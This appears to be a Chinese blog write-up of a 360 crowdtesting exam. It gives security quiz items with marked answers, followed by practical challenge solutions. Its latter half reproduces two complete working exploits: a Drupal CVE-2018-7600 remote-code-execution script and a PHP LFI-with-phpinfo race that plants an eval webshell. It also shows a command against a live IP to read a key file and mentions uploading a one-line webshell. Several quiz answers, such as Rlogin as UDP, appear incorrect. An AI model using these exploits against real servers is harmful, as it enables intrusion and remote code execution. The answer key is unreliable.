<h5 id="8、攻击者提交请求-http-www-360-cn-displaynews-asp-id-772-39-，网站反馈信息为Microsoft-OLE-DB-Provider-for-ODBC-Drivers错误‘80040e14’，能够说明该网站后端采用的数据库是哪个？：（）"><a href="#8、攻击者提交请求-http-www-360-cn-displaynews-asp-id-772-39-，网站反馈信息为Microsoft-OLE-DB-Provider-for-ODBC-Drivers错误‘80040e14’，能够说明该网站后端采用的数据库是哪个？：（）" class="headerlink" title="8、攻击者提交请求 http://www.360.cn/displaynews.asp?id=772&#39;，网站反馈信息为Microsoft OLE DB Provider for ODBC Drivers错误‘80040e14’，能够说明该网站后端采用的数据库是哪个？：（）"></a>8、攻击者提交请求 <a href="http://www.360.cn/displaynews.asp?id=772&#39;，网站反馈信息为Microsoft" target="_blank" rel="noopener">http://www.360.cn/displaynews.asp?id=772&#39;，网站反馈信息为Microsoft</a> OLE DB Provider for ODBC Drivers错误‘80040e14’，能够说明该网站后端采用的数据库是哪个？：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、mysql</li>
<li><input disabled="" type="checkbox"> B、Access</li>
<li><input disabled="" type="checkbox"> C、Orade</li>
<li><input checked="" disabled="" type="checkbox"> D、mssql</li>
</ul>
<h5 id="9、以下哪个选项，nmap会检测操作系统类型-：（）"><a href="#9、以下哪个选项，nmap会检测操作系统类型-：（）" class="headerlink" title="9、以下哪个选项，nmap会检测操作系统类型?：（）"></a>9、以下哪个选项，nmap会检测操作系统类型?：（）</h5><ul>
<li><input checked="" disabled="" type="checkbox"> A、-o</li>
<li><input disabled="" type="checkbox"> B、-v</li>
<li><input disabled="" type="checkbox"> C、-Sv</li>
<li><input disabled="" type="checkbox"> D、-Pn</li>
</ul>
<h5 id="10、对Linux服务器上-drwxr-xr-x-2-root-root-4096-Jun-21-2018-ssl-以下选项正确的是：（）"><a href="#10、对Linux服务器上-drwxr-xr-x-2-root-root-4096-Jun-21-2018-ssl-以下选项正确的是：（）" class="headerlink" title="10、对Linux服务器上 drwxr-xr-x 2 root root 4096 Jun 21 2018 ssl 以下选项正确的是：（）"></a>10、对Linux服务器上 drwxr-xr-x 2 root root 4096 Jun 21 2018 ssl 以下选项正确的是：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、该文件夹权限为655</li>
<li><input checked="" disabled="" type="checkbox"> B、这个文件夹中有两个文件</li>
<li><input disabled="" type="checkbox"> C、其他用户不能进入该文件夹</li>
<li><input disabled="" type="checkbox"> D、root用户组的用户对这个文件夹有全部权限</li>
</ul>
<h4 id="客观题-多选题"><a href="#客观题-多选题" class="headerlink" title="客观题-多选题"></a>客观题-多选题</h4><h5 id="1、以下哪些是WEB攻击方式：（）"><a href="#1、以下哪些是WEB攻击方式：（）" class="headerlink" title="1、以下哪些是WEB攻击方式：（）"></a>1、以下哪些是WEB攻击方式：（）</h5><ul>
<li><input checked="" disabled="" type="checkbox"> A、SQL注入</li>
<li><input checked="" disabled="" type="checkbox"> B、Cookie欺骗</li>
<li><input checked="" disabled="" type="checkbox"> C、CSRF</li>
<li><input checked="" disabled="" type="checkbox"> D、可执行脚本文件上传</li>
</ul>
<h5 id="2、下列不是Access创建的数据库文件后缀名有：（）"><a href="#2、下列不是Access创建的数据库文件后缀名有：（）" class="headerlink" title="2、下列不是Access创建的数据库文件后缀名有：（）"></a>2、下列不是Access创建的数据库文件后缀名有：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、.mdb</li>
<li><input checked="" disabled="" type="checkbox"> B、.MYD</li>
<li><input disabled="" type="checkbox"> C、.accdb</li>
<li><input checked="" disabled="" type="checkbox"> D、.sql</li>
</ul>
<h5 id="3、以下说法正确的有：（）"><a href="#3、以下说法正确的有：（）" class="headerlink" title="3、以下说法正确的有：（）"></a>3、以下说法正确的有：（）</h5><ul>
<li><input checked="" disabled="" type="checkbox"> A、病毒属于恶意代码</li>
<li><input disabled="" type="checkbox"> B、蠕虫不属于恶意代码</li>
<li><input checked="" disabled="" type="checkbox"> C、木马属于恶意代码</li>
<li><input disabled="" type="checkbox"> D、后门不属于恶意代码</li>
</ul>
<h5 id="4、御剑扫描器可以帮助我们发现以下哪些安全威胁：（）"><a href="#4、御剑扫描器可以帮助我们发现以下哪些安全威胁：（）" class="headerlink" title="4、御剑扫描器可以帮助我们发现以下哪些安全威胁：（）"></a>4、御剑扫描器可以帮助我们发现以下哪些安全威胁：（）</h5><ul>
<li><input checked="" disabled="" type="checkbox"> A、网站二级目录下的备份文件</li>
<li><input checked="" disabled="" type="checkbox"> B、网站编辑器fckeditor的目录</li>
<li><input disabled="" type="checkbox"> C、未及时安装补丁的Windows服务器</li>
<li><input checked="" disabled="" type="checkbox"> D、以前被黑客攻击留下的php木马</li>
</ul>
<h5 id="5、基于UDP协议的有：（）"><a href="#5、基于UDP协议的有：（）" class="headerlink" title="5、基于UDP协议的有：（）"></a>5、基于UDP协议的有：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、SNMP</li>
<li><input checked="" disabled="" type="checkbox"> B、Rlogin</li>
<li><input disabled="" type="checkbox"> C、POP3</li>
<li><input checked="" disabled="" type="checkbox"> D、DNS</li>
</ul>
<h4 id="判断题"><a href="#判断题" class="headerlink" title="判断题"></a>判断题</h4><h5 id="1、Windows系统中，只要可登录的用户，都可以创建新用户，并包括用户的名称与密码、用户所属的组等信息。"><a href="#1、Windows系统中，只要可登录的用户，都可以创建新用户，并包括用户的名称与密码、用户所属的组等信息。" class="headerlink" title="1、Windows系统中，只要可登录的用户，都可以创建新用户，并包括用户的名称与密码、用户所属的组等信息。"></a>1、Windows系统中，只要可登录的用户，都可以创建新用户，并包括用户的名称与密码、用户所属的组等信息。</h5><ul>
<li><input disabled="" type="checkbox"> 正确</li>
<li><input checked="" disabled="" type="checkbox"> 错误</li>
</ul>
<h5 id="2、chmod命令是Windows修改文件权限的命令。"><a href="#2、chmod命令是Windows修改文件权限的命令。" class="headerlink" title="2、chmod命令是Windows修改文件权限的命令。"></a>2、chmod命令是Windows修改文件权限的命令。</h5><ul>
<li><input disabled="" type="checkbox"> 正确</li>
<li><input checked="" disabled="" type="checkbox"> 错误</li>
</ul>
<h5 id="3、Kali数字取证操作系统是一款收费系统。"><a href="#3、Kali数字取证操作系统是一款收费系统。" class="headerlink" title="3、Kali数字取证操作系统是一款收费系统。"></a>3、Kali数字取证操作系统是一款收费系统。</h5><ul>
<li><input disabled="" type="checkbox"> 正确</li>
<li><input checked="" disabled="" type="checkbox"> 错误</li>
</ul>
<h5 id="4、Web应用程序中保存上传文件的目录应授予脚本执行权限。"><a href="#4、Web应用程序中保存上传文件的目录应授予脚本执行权限。" class="headerlink" title="4、Web应用程序中保存上传文件的目录应授予脚本执行权限。"></a>4、Web应用程序中保存上传文件的目录应授予脚本执行权限。</h5><ul>
<li><input disabled="" type="checkbox"> 正确</li>
<li><input checked="" disabled="" type="checkbox"> 错误</li>
</ul>
<h5 id="5、SQL注入漏洞不会对业务系统的账号密码产生影响。"><a href="#5、SQL注入漏洞不会对业务系统的账号密码产生影响。" class="headerlink" title="5、SQL注入漏洞不会对业务系统的账号密码产生影响。"></a>5、SQL注入漏洞不会对业务系统的账号密码产生影响。</h5><ul>
<li><input disabled="" type="checkbox"> 正确</li>
<li><input checked="" disabled="" type="checkbox"> 错误</li>
</ul>
<h4 id="实战题"><a href="#实战题" class="headerlink" title="实战题"></a>实战题</h4><h5 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415204118642.png" alt="image-20200415204118642"></p>
<p>修改方法为POST进行传输</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415204229002.png" alt="image-20200415204229002"></p>
<p>原题地址：<a href="https://www.jianshu.com/p/973b430a238c" target="_blank" rel="noopener">https://www.jianshu.com/p/973b430a238c</a></p>
<h5 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415204316500.png" alt="image-20200415204316500"></p>
<p>Struts2 直接用工具</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415204423879.png" alt="image-20200415204423879"></p>
<p>原题地址：<a href="https://www.jianshu.com/p/973b430a238c" target="_blank" rel="noopener">https://www.jianshu.com/p/973b430a238c</a></p>
<h5 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415204841529.png" alt="image-20200415204841529"></p>
<p>文件上传直接上传一句话木马进行菜刀连接</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415205259798.png" alt="image-20200415205259798"></p>
<p>原题地址：<a href="https://blog.csdn.net/qq_42357070/article/details/82383535" target="_blank" rel="noopener">https://blog.csdn.net/qq_42357070/article/details/82383535</a></p>
<h5 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415205412032.png" alt="image-20200415205412032"></p>
<p>当时没做出来…</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200417164319209.png" alt="image-20200417164319209"></p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200417164338990.png" alt="image-20200417164338990"></p>
<p>Samba远程命令执行漏洞（CVE-2017-7494）：<a href="https://www.jianshu.com/p/24c7494971a8" target="_blank" rel="noopener">https://www.jianshu.com/p/24c7494971a8</a></p>
<h5 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415205625769.png" alt="image-20200415205625769"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">POC:</span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line"><span class="keyword">from</span> bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">def get_args():</span><br><span class="line">  parser = argparse.ArgumentParser( <span class="attribute">prog</span>=<span class="string">"drupa7-CVE-2018-7600.py"</span>,</span><br><span class="line">                    <span class="attribute">formatter_class</span>=lambda prog: argparse.HelpFormatter(prog,<span class="attribute">max_help_position</span>=50),</span><br><span class="line">                    epilog= <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">                    This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 &lt;= 7.57</span></span><br><span class="line"><span class="string">                    by poisoning the recover password form (user/password) and triggering it with</span></span><br><span class="line"><span class="string">                    the upload file via ajax (/file/ajax).</span></span><br><span class="line"><span class="string">                    '</span><span class="string">''</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"target"</span>, <span class="attribute">help</span>=<span class="string">"URL of target Drupal site (ex: http://target.com/)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-c"</span>, <span class="string">"--command"</span>, <span class="attribute">default</span>=<span class="string">"id"</span>, <span class="attribute">help</span>=<span class="string">"Command to execute (default = id)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-f"</span>, <span class="string">"--function"</span>, <span class="attribute">default</span>=<span class="string">"passthru"</span>, <span class="attribute">help</span>=<span class="string">"Function to use as attack vector (default = passthru)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-p"</span>, <span class="string">"--proxy"</span>, <span class="attribute">default</span>=<span class="string">""</span>, <span class="attribute">help</span>=<span class="string">"Configure a proxy in the format http://127.0.0.1:8080/ (default = none)"</span>)</span><br><span class="line">  args = parser.parse_args()</span><br><span class="line">  return args</span><br><span class="line"></span><br><span class="line">def pwn_target(target, function, command, proxy):</span><br><span class="line">  requests.packages.urllib3.disable_warnings()</span><br><span class="line">  proxies = &#123;<span class="string">'http'</span>: proxy, <span class="string">'https'</span>: proxy&#125;</span><br><span class="line">  <span class="builtin-name">print</span>(<span class="string">'[*] Poisoning a form and including it in cache.'</span>)</span><br><span class="line">  get_params = &#123;<span class="string">'q'</span>:<span class="string">'user/password'</span>, <span class="string">'name[#post_render][]'</span>:function, <span class="string">'name[#type]'</span>:<span class="string">'markup'</span>, <span class="string">'name[#markup]'</span>: command&#125;</span><br><span class="line">  post_params = &#123;<span class="string">'form_id'</span>:<span class="string">'user_pass'</span>, <span class="string">'_triggering_element_name'</span>:<span class="string">'name'</span>, <span class="string">'_triggering_element_value'</span>:<span class="string">''</span>, <span class="string">'opz'</span>:<span class="string">'E-mail new Password'</span>&#125;</span><br><span class="line">  r = requests.post(target, <span class="attribute">params</span>=get_params, <span class="attribute">data</span>=post_params, <span class="attribute">verify</span>=<span class="literal">False</span>, <span class="attribute">proxies</span>=proxies)</span><br><span class="line">  soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)</span><br><span class="line">  try:</span><br><span class="line">    form = soup.<span class="builtin-name">find</span>(<span class="string">'form'</span>, &#123;<span class="string">'id'</span>: <span class="string">'user-pass'</span>&#125;)</span><br><span class="line">    form_build_id = form.<span class="builtin-name">find</span>(<span class="string">'input'</span>, &#123;<span class="string">'name'</span>: <span class="string">'form_build_id'</span>&#125;).<span class="builtin-name">get</span>(<span class="string">'value'</span>)</span><br><span class="line">    <span class="keyword">if</span> form_build_id:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">'[*] Poisoned form ID: '</span> + form_build_id)</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">'[*] Triggering exploit to execute: '</span> + command)</span><br><span class="line">        get_params = &#123;<span class="string">'q'</span>:<span class="string">'file/ajax/name/#value/'</span> + form_build_id&#125;</span><br><span class="line">        post_params = &#123;<span class="string">'form_build_id'</span>:form_build_id&#125;</span><br><span class="line">        r = requests.post(target, <span class="attribute">params</span>=get_params, <span class="attribute">data</span>=post_params, <span class="attribute">verify</span>=<span class="literal">False</span>, <span class="attribute">proxies</span>=proxies)</span><br><span class="line">        parsed_result = r.text.split(<span class="string">'[&#123;"command":"settings"'</span>)[0]</span><br><span class="line">        <span class="builtin-name">print</span>(parsed_result)</span><br><span class="line">  except:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"ERROR: Something went wrong."</span>)</span><br><span class="line">    raise</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">  <span class="builtin-name">print</span> ()</span><br><span class="line">  <span class="builtin-name">print</span> (<span class="string">'============================================================================='</span>)</span><br><span class="line">  <span class="builtin-name">print</span> (<span class="string">'|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |'</span>)</span><br><span class="line">  <span class="builtin-name">print</span> (<span class="string">'|                              by pimps                                     |'</span>)</span><br><span class="line">  <span class="builtin-name">print</span> (<span class="string">'=============================================================================\n'</span>)</span><br><span class="line"></span><br><span class="line">  args = get_args() # <span class="builtin-name">get</span> the cl args</span><br><span class="line">  pwn_target(args.target.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>

<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415205746961.png" alt="image-20200415205746961"></p>
<h5 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415205810082.png" alt="image-20200415205810082"></p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415205827356.png" alt="image-20200415205827356"></p>
<p>提示：php文件包含</p>
<p>发现 <a href="http://www.zip源码" target="_blank" rel="noopener">www.zip源码</a></p>
<p>下载发现lfi.php文件</p>
<p>php文件包含漏洞（利用phpinfo）</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415210025732.png" alt="image-20200415210025732"></p>
<p>GitHub：<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">EXP:</span><br><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    self.event.set()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">写入<span class="regexp">/tmp/g</span></span><br><span class="line">再访问</span><br><span class="line">http:<span class="regexp">//</span><span class="number">39.98</span>.<span class="number">39.234</span>:<span class="number">41213</span><span class="regexp">/lfi.php?file=/</span>tmp<span class="regexp">/g&amp;1=system(%27cat ../</span>..<span class="regexp">/../</span>key_8ujr4y7sg9.txt%<span class="number">27</span>);</span><br></pre></td></tr></table></figure>

<p>可以参考这个：</p>
<p><a href="https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf" target="_blank" rel="noopener">https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf</a></p>
<p><a href="https://www.cnblogs.com/xiaoqiyue/p/10158702.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoqiyue/p/10158702.html</a></p>
